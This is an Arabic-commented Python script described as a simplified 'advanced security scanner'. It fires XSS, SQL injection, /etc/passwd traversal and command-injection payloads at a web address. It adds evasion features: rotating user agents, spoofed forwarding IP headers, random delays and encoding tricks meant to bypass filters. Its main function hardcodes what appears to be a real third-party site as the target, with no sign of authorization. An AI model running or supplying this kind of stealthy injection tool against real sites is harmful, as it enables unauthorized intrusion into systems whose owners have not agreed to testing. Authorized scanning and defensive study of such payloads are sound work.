#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
الفاحص الأمني المتقدم - نسخة مبسطة للاختبار
Advanced Security Scanner - Simplified Test Version
"""

import requests
import random
import time
import json
import base64
import urllib.parse
import html
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

class SimpleAdvancedScanner:
    """فاحص أمني متقدم مبسط"""
    
    def __init__(self):
        requests.packages.urllib3.disable_warnings()
        
        # قوائم الحمولات الأساسية
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            'sql': [
                "' OR '1'='1",
                "' UNION SELECT null,null,null--",
                "admin'--",
                "1' OR 1=1--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            'command': [
                "; id",
                "| id",
                "&& id",
                "$(id)"
            ]
        }

    def generate_headers(self, stealth_level):
        """إنشاء هيدرات عشوائية"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        headers = {'User-Agent': random.choice(user_agents)}
        
        if stealth_level >= 2:
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            })
        
        if stealth_level >= 3:
            headers.update({
                'X-Real-IP': f"{random.randint(10,100)}.{random.randint(10,100)}.{random.randint(10,100)}.{random.randint(10,100)}",
                'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache'
            })
        
        return headers

    def apply_bypass(self, payload, technique):
        """تطبيق تقنية تخطي"""
        if technique == 'url_encode':
            return urllib.parse.quote(payload)
        elif technique == 'double_encode':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif technique == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif technique == 'html_encode':
            return html.escape(payload)
        elif technique == 'mixed_case':
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        else:
            return payload

    def test_payload(self, target_url, payload, scan_type, headers):
        """اختبار حمولة واحدة"""
        try:
            test_url = f"{target_url}?input={payload}"
            response = requests.get(test_url, headers=headers, verify=False, timeout=10)
            
            # تحليل الاستجابة
            vulnerable = False
            text = response.text.lower()
            
            if scan_type == 'xss':
                vulnerable = any(indicator in text for indicator in ['alert(', 'javascript:', 'onerror='])
            elif scan_type == 'sql':
                vulnerable = any(indicator in text for indicator in ['mysql', 'sql', 'syntax error', 'database'])
            elif scan_type == 'lfi':
                vulnerable = any(indicator in text for indicator in ['root:', 'etc/passwd', 'daemon:'])
            elif scan_type == 'command':
                vulnerable = any(indicator in text for indicator in ['uid=', 'gid=', 'whoami', 'root'])
            
            return {
                'payload': payload,
                'vulnerable': vulnerable,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response.elapsed.total_seconds()
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'vulnerable': False,
                'error': str(e),
                'status_code': 0
            }

    def scan_target(self, target_url, scan_type='all', stealth_level=3, max_threads=5):
        """فحص الهدف"""
        
        print(f"🚀 بدء الفحص الأمني المتقدم")
        print(f"🎯 الهدف: {target_url}")
        print(f"🔍 نوع الفحص: {scan_type}")
        print(f"🛡️ مستوى التخفي: {stealth_level}")
        print("=" * 60)
        
        start_time = time.time()
        results = {
            'target': target_url,
            'scan_type': scan_type,
            'stealth_level': stealth_level,
            'start_time': datetime.now().isoformat(),
            'vulnerabilities': {},
            'statistics': {}
        }
        
        # تحديد أنواع الفحص
        if scan_type == 'all':
            scan_types = ['xss', 'sql', 'lfi', 'command']
        else:
            scan_types = [scan_type]
        
        total_tests = 0
        total_vulnerabilities = 0
        
        for scan_t in scan_types:
            print(f"\n🔍 فحص {scan_t.upper()}...")
            
            if scan_t not in self.payloads:
                continue
                
            scan_results = []
            payloads = self.payloads[scan_t]
            
            for i, payload in enumerate(payloads, 1):
                print(f"  📡 اختبار {i}/{len(payloads)}: {payload[:50]}...")
                
                # إضافة تأخير عشوائي
                time.sleep(random.uniform(0.5, 2.0))
                
                # اختبار الحمولة الأساسية
                headers = self.generate_headers(stealth_level)
                result = self.test_payload(target_url, payload, scan_t, headers)
                scan_results.append(result)
                
                if result['vulnerable']:
                    print(f"    ✅ تم اكتشاف ثغرة!")
                else:
                    print(f"    ❌ لم يتم اكتشاف ثغرة")
                
                total_tests += 1
                if result['vulnerable']:
                    total_vulnerabilities += 1
                
                # اختبار تقنيات التخطي
                if stealth_level >= 3:
                    bypass_techniques = ['url_encode', 'mixed_case']
                    for technique in bypass_techniques:
                        bypassed_payload = self.apply_bypass(payload, technique)
                        bypass_result = self.test_payload(target_url, bypassed_payload, scan_t, headers)
                        scan_results.append(bypass_result)
                        
                        total_tests += 1
                        if bypass_result['vulnerable']:
                            total_vulnerabilities += 1
                            print(f"    🎯 تم اكتشاف ثغرة باستخدام {technique}!")
            
            results['vulnerabilities'][scan_t] = scan_results
        
        # إحصائيات
        end_time = time.time()
        results['statistics'] = {
            'total_tests': total_tests,
            'total_vulnerabilities': total_vulnerabilities,
            'success_rate': (total_vulnerabilities / total_tests * 100) if total_tests > 0 else 0,
            'scan_duration': end_time - start_time
        }
        
        results['end_time'] = datetime.now().isoformat()
        
        # عرض الملخص
        print("\n" + "=" * 60)
        print("📊 ملخص الفحص:")
        print(f"✅ إجمالي الاختبارات: {total_tests}")
        print(f"⚠️ الثغرات المكتشفة: {total_vulnerabilities}")
        print(f"📈 نسبة النجاح: {results['statistics']['success_rate']:.1f}%")
        print(f"⏱️ مدة الفحص: {results['statistics']['scan_duration']:.2f} ثانية")
        
        return results

    def save_report(self, results, filename=None):
        """حفظ التقرير"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"simple_scan_report_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        
        print(f"📄 تم حفظ التقرير: {filename}")
        return filename

def main():
    """الدالة الرئيسية"""
    
    print("🚀 الفاحص الأمني المتقدم - النسخة المبسطة")
    print("=" * 60)
    
    # إنشاء الماسح
    scanner = SimpleAdvancedScanner()
    
    # إعدادات الفحص
    target_url = "https://dxp.salam.sa/test.php"
    scan_type = "all"  # all, xss, sql, lfi, command
    stealth_level = 4  # 1-5
    
    try:
        # تنفيذ الفحص
        results = scanner.scan_target(target_url, scan_type, stealth_level)
        
        # حفظ التقرير
        report_file = scanner.save_report(results)
        
        print(f"\n✅ اكتمل الفحص بنجاح!")
        print(f"📋 تم حفظ التقرير: {report_file}")
        
    except Exception as e:
        print(f"❌ خطأ أثناء الفحص: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()